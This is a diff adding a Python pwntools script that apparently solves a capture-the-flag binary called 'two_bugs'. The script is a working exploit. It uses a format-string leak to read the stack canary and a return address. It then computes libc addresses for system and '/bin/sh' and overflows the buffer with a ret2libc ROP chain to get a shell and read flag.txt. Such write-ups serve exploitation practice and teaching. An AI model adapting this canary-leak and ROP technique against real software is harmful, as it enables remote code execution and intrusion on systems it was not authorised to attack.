@@ -1,0 +1,73 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from time import sleep
+
+exe = context.binary = ELF("./two_bugs", checksec=False)
+context.log_level = "error"
+
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["/mnt/d/Programs/wsl-terminal/open-wsl.exe", "-e"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def exec_fmt(payload):
+    io = start([payload])
+    res = io.recvuntil("\n")
+    io.close()
+    return res
+
+def main():
+
+    # first, we use the fmtstr vuln to grab some stuff from the stack
+    io = start(["%17$p|%18$p|%19$p"])
+    addrs = io.recv().split()[0].split(b'|')
+    # some gdb investigation shows us, that these are the canary
+    # and the return address
+    canary, _, ret_addr = addrs
+
+    # to get the addr of system:
+    ret_addr_base = 0x7ffff7e14b25
+    system_addr_base = 0x7ffff7e37120
+    system_addr = int(ret_addr, base=16) - ret_addr_base + system_addr_base
+    # and /bin/sh:
+    bin_sh_addr_base = 0x7ffff7f79966
+    bin_sh_addr = int(ret_addr, base=16) - ret_addr_base + bin_sh_addr_base
+
+    # we also need to do a ropchain, do get /bin/sh into RDI, before calling system
+    libc_addr = 0x7ffff7ded000 - system_addr_base + system_addr
+    pop_rdi_addr = 0x0000000000027f75 + libc_addr
+
+    # now we can just overwrite the stack and get a nice ret2libc :)
+    
+    # first, we need to find the distance between the buffer and
+    # the canary, using GDB we get to 72. (Why though, should it not be 64?)
+
+    system_addr = struct.pack('<Q', system_addr)
+    bin_sh_addr = struct.pack('<Q', bin_sh_addr)
+    canary = struct.pack('<Q', int(canary, base=16))
+    pop_rdi_addr = struct.pack('<Q', pop_rdi_addr)
+
+    injection = [b"a"*72] + [canary] + [b"PABE"*2] + [pop_rdi_addr] + [bin_sh_addr] + [system_addr] 
+    raw = b"".join(injection)
+    io.sendline(raw)
+
+    # and grab the flag
+    sleep(0.5)
+    io.sendline("cat flag.txt")
+    print(io.recvuntil("}").decode("utf-8"))
+    io.close()
+    
+if __name__ == "__main__":
+    main()
